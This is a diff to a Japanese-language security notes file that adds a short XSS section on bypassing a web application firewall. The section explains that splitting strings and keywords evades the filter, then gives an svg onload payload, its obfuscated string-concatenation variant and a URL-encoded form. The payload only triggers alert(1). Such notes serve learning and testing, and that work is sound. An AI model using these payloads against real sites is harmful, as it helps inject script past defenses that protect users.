@@ -1,6 +1,20 @@
 ### XSS
+
+#### WAFバイパス
+WAFは「(」と「)」の順序で括弧をキャッチする  
+→文字列を複数の部分に分割したり、キーワードを分割したり、文字の順序を変更すればWAFを回避できる  
+
 ```
 <svg+onload=location='javascript:alert(1)'>
+
+↓これだとひっかかるから改造する
+
+<svg onload=a=')',b='t(1',j='javas',s='cript:aler',location=j+s+b+a>
+
+↓これをエンコードして実行する
+
+%3Csvg%20onload%3Da%3D')'%2Cb%3D't(1'%2Cj%3D'javas'%2Cs%3D'cript%3Aaler'%2Clocation%3Dj%2Bs%2Bb%2Ba%3E
+
 ```
 
 ### API
